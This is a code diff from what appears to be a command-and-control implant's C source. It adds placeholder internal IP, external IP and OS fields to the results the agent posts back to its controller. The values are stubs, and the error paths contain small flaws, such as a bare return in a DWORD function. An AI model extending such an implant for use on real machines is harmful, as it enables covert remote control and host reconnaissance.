@@ -179,8 +179,48 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
     DEBUG_LOG("command_result_data: %s\n", OutboundJsonData->command_result_data ? OutboundJsonData->command_result_data : "NULL");
 
+    // get data needed for metadata stuff
+    char *int_ip = "placeholder_int_ip";
+    OutboundJsonData->int_ip = strdup(int_ip);
+    if (!OutboundJsonData->int_ip)
+    {
+        DEBUG_LOG("Memory allocation failed for int_ip.\n");
+        free(OutboundJsonData->int_ip);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // external ip
+    char *ext_ip = "placeholder_ext_ip";
+    OutboundJsonData->ext_ip = strdup(ext_ip);
+    if (!OutboundJsonData->ext_ip)
+    {
+        DEBUG_LOG("Memory allocation failed for ext_ip.\n");
+        free(OutboundJsonData->ext_ip);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // os
+    char *os = "placeholder_os";
+    OutboundJsonData->os = strdup(os);
+    if (!OutboundJsonData->os)
+    {
+        DEBUG_LOG("Memory allocation failed for os.\n");
+        free(OutboundJsonData->os);
+        free(OutboundJsonData);
+        return;
+    }
+
     // Convert to JSON and send
-    char *encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
+    // char *encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
+    char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
+                                              OutboundJsonData->command_result_data,
+                                              InboundJsonData.command_id,
+                                              OutboundJsonData->int_ip,
+                                              OutboundJsonData->ext_ip,
+                                              OutboundJsonData->os);
+
     post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
 
     // free allocated memory
@@ -193,7 +233,10 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     // Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
     free(OutboundJsonData->agent_id);            // freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
     free(OutboundJsonData->command_result_data); // freeing due to set_response_data function in whipser_commands.h
-    free(OutboundJsonData);                      // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
+    free(OutboundJsonData->int_ip);
+    free(OutboundJsonData->ext_ip);
+    free(OutboundJsonData->os);
+    free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
     return 0;
 }
